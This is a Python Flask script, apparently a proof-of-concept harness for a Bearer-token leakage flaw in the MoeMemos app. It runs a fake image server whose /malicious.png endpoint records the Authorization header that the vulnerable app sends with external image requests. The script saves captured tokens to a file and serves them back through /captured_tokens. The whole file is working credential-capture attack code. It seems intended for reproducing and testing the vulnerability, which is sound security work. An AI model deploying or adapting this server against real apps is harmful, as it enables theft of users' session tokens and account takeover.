#!/usr/bin/env python3
"""
Token Catcher Service for MoeMemos Token Leakage Vulnerability

This Flask service acts as a malicious image server that captures Bearer tokens
sent by the vulnerable MoeMemos app when it loads external images.

Endpoints:
    GET /malicious.png - Serves a fake image and logs Authorization header
    GET /captured_tokens - Returns list of captured tokens
    GET /health - Health check endpoint
"""

import json
import os
import threading
from datetime import datetime
from pathlib import Path

from flask import Flask, jsonify, request
from werkzeug.serving import make_server

app = Flask(__name__)

# Storage for captured tokens
captured_tokens = []
TOKENS_FILE = Path("/tmp/captured_tokens.json")


def load_captured_tokens():
    """Load captured tokens from file if it exists."""
    global captured_tokens
    if TOKENS_FILE.exists():
        try:
            with open(TOKENS_FILE, "r") as f:
                captured_tokens = json.load(f)
        except Exception as e:
            print(f"Error loading tokens: {e}")
            captured_tokens = []


def save_captured_tokens():
    """Save captured tokens to file."""
    try:
        with open(TOKENS_FILE, "w") as f:
            json.dump(captured_tokens, f, indent=2)
    except Exception as e:
        print(f"Error saving tokens: {e}")


@app.route("/health", methods=["GET"])
def health():
    """Health check endpoint."""
    return jsonify({"status": "healthy"}), 200


@app.route("/malicious.png", methods=["GET"])
def malicious_image():
    """
    Serve a fake image and capture any Authorization header sent.

    This endpoint mimics an external image server (like S3) that receives
    the victim's Bearer token due to the vulnerability.
    """
    auth_header = request.headers.get("Authorization", None)

    capture_data = {
        "timestamp": datetime.utcnow().isoformat(),
        "authorization_header": auth_header,
        "user_agent": request.headers.get("User-Agent", ""),
        "source_ip": request.remote_addr,
        "full_url": request.url,
    }

    print("[TOKEN CAPTURE] Received request for malicious.png")
    print(f"[TOKEN CAPTURE] Authorization: {auth_header}")

    if auth_header and auth_header.startswith("Bearer "):
        token = auth_header.replace("Bearer ", "").strip()
        print(f"[TOKEN CAPTURE] ✓ CAPTURED TOKEN: {token[:20]}...")

        captured_tokens.append(capture_data)
        save_captured_tokens()
    else:
        print("[TOKEN CAPTURE] ✗ No Bearer token in Authorization header")

    # Return a 1x1 transparent PNG
    # This is a minimal valid PNG file
    png_data = bytes(
        [
            0x89,
            0x50,
            0x4E,
            0x47,
            0x0D,
            0x0A,
            0x1A,
            0x0A,  # PNG signature
            0x00,
            0x00,
            0x00,
            0x0D,
            0x49,
            0x48,
            0x44,
            0x52,  # IHDR chunk
            0x00,
            0x00,
            0x00,
            0x01,
            0x00,
            0x00,
            0x00,
            0x01,  # 1x1 dimensions
            0x08,
            0x06,
            0x00,
            0x00,
            0x00,
            0x1F,
            0x15,
            0xC4,
            0x89,
            0x00,
            0x00,
            0x00,
            0x0A,
            0x49,
            0x44,
            0x41,  # IDAT chunk
            0x54,
            0x78,
            0x9C,
            0x63,
            0x00,
            0x01,
            0x00,
            0x00,
            0x05,
            0x00,
            0x01,
            0x0D,
            0x0A,
            0x2D,
            0xB4,
            0x00,
            0x00,
            0x00,
            0x00,
            0x49,
            0x45,
            0x4E,
            0x44,
            0xAE,  # IEND chunk
            0x42,
            0x60,
            0x82,
        ]
    )

    return png_data, 200, {"Content-Type": "image/png", "Content-Length": len(png_data)}


@app.route("/captured_tokens", methods=["GET"])
def get_captured_tokens():
    """
    Return the list of captured tokens.

    The exploit script or test verification can call this endpoint
    to check if any tokens were successfully captured.

    Returns:
        JSON with list of captured token data including timestamps
    """
    return (
        jsonify(
            {
                "status": "success",
                "count": len(captured_tokens),
                "tokens": captured_tokens,
            }
        ),
        200,
    )


@app.route("/clear_tokens", methods=["POST"])
def clear_tokens():
    """Clear all captured tokens (useful for testing)."""
    global captured_tokens
    captured_tokens = []
    if TOKENS_FILE.exists():
        TOKENS_FILE.unlink()
    return jsonify({"status": "success", "message": "All tokens cleared"}), 200


class ServerThread(threading.Thread):
    """Thread to run Flask server."""

    def __init__(self, app, port):
        threading.Thread.__init__(self)
        self.server = make_server("0.0.0.0", port, app)
        self.ctx = app.app_context()
        self.ctx.push()

    def run(self):
        print("Starting token catcher server...")
        self.server.serve_forever()

    def shutdown(self):
        self.server.shutdown()


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8082))

    # Load any previously captured tokens
    load_captured_tokens()

    print("=" * 60)
    print("Token Catcher Server")
    print("=" * 60)
    print(f"Listening on: 0.0.0.0:{port}")
    print(f"Malicious image URL: http://localhost:{port}/malicious.png")
    print(f"Check captured tokens: http://localhost:{port}/captured_tokens")
    print("=" * 60)

    app.run(host="0.0.0.0", port=port, debug=False)
